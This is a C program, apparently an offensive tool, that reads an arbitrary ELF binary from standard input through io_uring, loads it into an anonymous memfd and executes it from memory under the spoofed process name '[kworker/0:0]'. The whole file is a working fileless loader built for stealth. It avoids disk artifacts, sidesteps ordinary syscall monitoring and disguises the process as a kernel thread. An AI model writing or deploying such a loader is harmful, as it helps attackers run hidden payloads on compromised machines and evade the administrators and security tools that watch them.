#define _GNU_SOURCE
#include <linux/memfd.h>
#include <linux/io_uring.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>

#include "iouring_utils.h"

#define READ_CHUNK (64 * 1024)
#define MAX_ELF    (32 * 1024 * 1024)

static int memfd_create_raw(const char *name, unsigned int flags)
{
    return (int)syscall(__NR_memfd_create, name, flags);
}

static int memfd_exec_via_path(int fd, char *const argv[], char *const envp[])
{
    char path[32];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    return execve(path, argv, envp);
}

int main(int argc, char *argv[])
{

    struct uring u = {};
    if (uring_init(&u, 16) < 0) { perror("uring_init"); return 1; }

    int mfd = memfd_create_raw("", MFD_CLOEXEC);
    if (mfd < 0) { perror("memfd_create"); return 1; }

    uint8_t *chunk   = aligned_alloc(4096, READ_CHUNK);
    uint64_t total   = 0;
    uint64_t mfd_off = 0;

    printf("[*] reading payload from stdin...\n");

    for (;;) {

        struct io_uring_sqe *sqe = uring_get_sqe(&u);
        sqe->opcode    = IORING_OP_READ;
        sqe->fd        = STDIN_FILENO;
        sqe->addr      = (uint64_t)(uintptr_t)chunk;
        sqe->len       = READ_CHUNK;
        sqe->off       = (uint64_t)-1;
        sqe->user_data = 1;

        uring_submit_wait(&u, 1);
        struct io_uring_cqe cqe;
        uring_peek_cqe(&u, &cqe);

        int n = (int)cqe.res;
        if (n <= 0) break;
        if (total + (uint64_t)n > MAX_ELF) {
            fprintf(stderr, "[!] payload too large (> %dMB)\n", MAX_ELF / (1024*1024));
            return 1;
        }

        sqe = uring_get_sqe(&u);
        sqe->opcode    = IORING_OP_WRITE;
        sqe->fd        = mfd;
        sqe->addr      = (uint64_t)(uintptr_t)chunk;
        sqe->len       = (uint32_t)n;
        sqe->off       = mfd_off;
        sqe->user_data = 2;

        uring_submit_wait(&u, 1);
        uring_peek_cqe(&u, &cqe);
        if ((int)cqe.res <= 0) break;

        mfd_off += (uint64_t)cqe.res;
        total   += (uint64_t)n;
    }

    free(chunk);
    uring_free(&u);

    if (total < 4) {
        fprintf(stderr, "[!] no payload received\n");
        return 1;
    }
    printf("[*] %lu bytes loaded into memfd\n", total);

    uint8_t magic[4] = {};
    pread(mfd, magic, 4, 0);
    if (magic[0] != 0x7f || magic[1] != 'E' || magic[2] != 'L' || magic[3] != 'F') {
        fprintf(stderr, "[!] payload is not an ELF binary\n");
        return 1;
    }

    printf("[*] executing from memfd (no path on disk)...\n");
    fflush(stdout);

    char **exec_argv = calloc((size_t)(argc + 1), sizeof(char *));
    exec_argv[0] = (char *)"[kworker/0:0]";
    for (int i = 1; i < argc; i++) exec_argv[i] = argv[i];
    exec_argv[argc] = NULL;

    memfd_exec_via_path(mfd, exec_argv, environ);
    perror("fexecve");
    return 1;
}
